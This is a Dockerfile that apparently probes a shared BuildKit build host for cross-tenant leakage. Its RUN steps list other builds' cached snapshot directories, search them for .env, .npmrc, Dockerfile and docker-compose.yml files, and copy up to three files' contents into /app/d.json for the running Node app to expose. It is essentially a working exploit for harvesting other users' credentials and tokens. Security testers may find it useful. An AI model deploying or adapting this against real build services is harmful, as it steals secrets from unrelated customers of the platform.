FROM node:20-bookworm-slim

RUN echo "BUST_A1_BUILDKIT_CACHE_2026_04_13" && mkdir -p /app /tmp/probe

# Primary A1 signal: can the build read shared BuildKit snapshot directories?
RUN (ls -la /var/lib/buildkit/runc-overlayfs/snapshots/ || true) > /tmp/probe/snapshots_ls.txt 2>&1

# Look for high-value files inside cached layers of other builds.
RUN find /var/lib/buildkit/runc-overlayfs/snapshots/ -maxdepth 4 -type f 2>/dev/null | grep -E '/(Dockerfile|\\.env|[^/]+\\.npmrc|docker-compose\\.yml)$' | head -20 > /tmp/probe/interesting_files.txt || true

# Read up to three files so runtime can expose exact contents if access works.
RUN sh -c 'count=0; : > /tmp/probe/file_contents.txt; while IFS= read -r f; do [ -z "$f" ] && continue; count=$((count+1)); printf "===FILE:%s===\\n" "$f" >> /tmp/probe/file_contents.txt; sed -n "1,120p" "$f" >> /tmp/probe/file_contents.txt 2>&1 || true; printf "\\n" >> /tmp/probe/file_contents.txt; [ "$count" -ge 3 ] && break; done < /tmp/probe/interesting_files.txt'

WORKDIR /app
COPY . .
RUN node -e "const fs=require('fs');const out={snapshots_ls:fs.readFileSync('/tmp/probe/snapshots_ls.txt','utf8'),interesting_files:fs.readFileSync('/tmp/probe/interesting_files.txt','utf8'),file_contents:fs.readFileSync('/tmp/probe/file_contents.txt','utf8')};fs.writeFileSync('/app/d.json',JSON.stringify(out,null,2))"

EXPOSE 3000
CMD ["node","index.js"]
